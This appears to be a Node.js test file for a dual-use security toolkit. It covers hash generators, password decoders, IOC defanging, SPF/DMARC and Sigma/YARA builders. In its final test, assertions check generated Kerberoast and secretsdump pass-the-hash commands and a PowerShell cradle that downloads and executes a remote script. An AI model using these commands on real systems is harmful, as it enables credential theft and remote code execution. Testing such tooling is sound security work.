// Red/blue/purple batch 2: builders, parsers, crypto. Run: npm test
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { cisco7Decode, cisco7Encode, juniperDecode, juniperEncode } from '../assets/tools/lib/cisco7.js';
import { lmHash, md5crypt, generate } from '../assets/tools/lib/targethash.js';
import { extract, defang, refang } from '../assets/tools/lib/ioc.js';
import { interpretations, toMs, fromMs } from '../assets/tools/lib/timestamp.js';
import { maskKeyspace, charsetSize, keyspace, human } from '../assets/tools/lib/cracktime.js';
import { buildSPF, buildDMARC, explain } from '../assets/tools/lib/dmarc.js';
import { strength } from '../assets/tools/lib/pwstrength.js';
import { TOOLS } from '../assets/tools/lib/impacket.js';
import { CRADLES } from '../assets/tools/lib/cradle.js';
import { sigma, yara } from '../assets/tools/lib/rules.js';

test('cisco7 / juniper', () => {
  assert.equal(cisco7Decode('094F471A1A0A'), 'cisco');
  assert.equal(cisco7Decode(cisco7Encode('S3cret!', 9)), 'S3cret!');
  assert.equal(juniperDecode(juniperEncode('Passw0rd')), 'Passw0rd');
});

test('target hashes (known vectors)', async () => {
  assert.equal(lmHash(''), 'AAD3B435B51404EEAAD3B435B51404EE');
  assert.equal(lmHash('PASSWORD'), 'E52CAC67419A9A224A3B108F3FA6CB6D');
  assert.equal(md5crypt('password', 'salt'), '$1$salt$qJH7.N4xYta3aEG/dfqo/0');
  const g = await generate('password');
  const by = (n) => g.find((r) => r[0] === n)[1];
  assert.equal(by('NTLM'), '8846f7eaee8fb117ad06bdd830b7586c');
  assert.equal(by('MD5'), '5f4dcc3b5aa765d61d8327deb882cf99');
  assert.equal(by('SHA-1'), '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8');
  assert.equal(by('MySQL 4.1+'), '*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19');
  assert.equal(by('MySQL 323 (old)'), '5d2e19393cc5ef67');
});

test('IOC extract + defang', () => {
  const r = extract('evil at 8[.]8[.]8[.]8 and hxxps://bad[.]example[.]com/x plus d41d8cd98f00b204e9800998ecf8427e CVE-2021-44228 a@b.com');
  assert.ok(r.ipv4.includes('8.8.8.8'));
  assert.ok(r.url.some((u) => u.includes('bad.example.com')));
  assert.ok(r.md5.includes('d41d8cd98f00b204e9800998ecf8427e'));
  assert.ok(r.cve.includes('CVE-2021-44228'));
  assert.ok(r.email.includes('a@b.com'));
  assert.equal(defang('http://1.2.3.4/x'), 'hxxp://1[.]2[.]3[.]4/x');
  assert.equal(refang('hxxps://a[.]b[.]com'), 'https://a.b.com');
});

test('timestamp conversions', () => {
  // 2021-01-01T00:00:00Z = unix 1609459200
  const ms = toMs(1609459200, 'unix');
  assert.equal(new Date(ms).toISOString(), '2021-01-01T00:00:00.000Z');
  assert.equal(fromMs(ms, 'filetime'), 132539328000000000);
  assert.equal(fromMs(ms, 'webkit'), 13253932800000000);
  const it = interpretations(1609459200);
  assert.equal(it.find((x) => x.id === 'unix').iso, '2021-01-01T00:00:00.000Z');
});

test('crack-time maths', () => {
  assert.equal(charsetSize(['lower', 'upper', 'digits']), 62);
  assert.equal(keyspace(62, 8), Math.pow(62, 8));
  assert.equal(maskKeyspace('?u?l?l?l?d?d').keyspace, 26 * 26 * 26 * 26 * 10 * 10);
  assert.equal(maskKeyspace('?d?d?d?d').keyspace, 10000);
  assert.match(human(1e12), /year/);
});

test('SPF / DMARC builder + explain', () => {
  assert.equal(buildSPF({ ip4: '1.2.3.4', include: '_spf.google.com', all: '-' }), 'v=spf1 ip4:1.2.3.4 include:_spf.google.com -all');
  assert.equal(buildDMARC({ domain: 'x.com', p: 'reject', rua: 'a@x.com' }).value, 'v=DMARC1; p=reject; rua=mailto:a@x.com');
  assert.equal(explain('v=spf1 -all').type, 'SPF');
  assert.equal(explain('v=DMARC1; p=none').type, 'DMARC');
});

test('password strength', () => {
  assert.equal(strength('password').score, 0);
  assert.ok(strength('Tr0ub4dour&3xplanation!').score >= 3);
  assert.ok(strength('aaaaaa').score === 0);
  assert.ok(strength('correct horse battery staple').bits > 40);
});

test('impacket / cradle / rules builders', () => {
  const ks = TOOLS.find((t) => t.id === 'kerberoast');
  assert.match(ks.build({ domain: 'corp.local', user: 'svc', pass: 'p', dcip: '10.0.0.1' }), /GetUserSPNs corp\.local\/svc:p -dc-ip 10\.0\.0\.1 -request/);
  assert.match(TOOLS.find((t) => t.id === 'secretsdump').build({ domain: 'd', user: 'u', hash: 'aad3b435b51404eeaad3b435b51404ee:x' }), /-hashes :/);
  assert.match(CRADLES.find((c) => c.id === 'ps-iex').build('http://10.0.0.1/a.ps1'), /IEX\(New-Object Net\.WebClient\)\.DownloadString\('http:\/\/10\.0\.0\.1\/a\.ps1'\)/);
  assert.match(sigma({ title: 'Test', mitre: 'T1003' }), /title: Test[\s\S]*logsource:/);
  assert.match(yara({ name: 'x', strings: 'malware\n4D 5A' }), /rule x[\s\S]*strings:[\s\S]*condition:/);
});
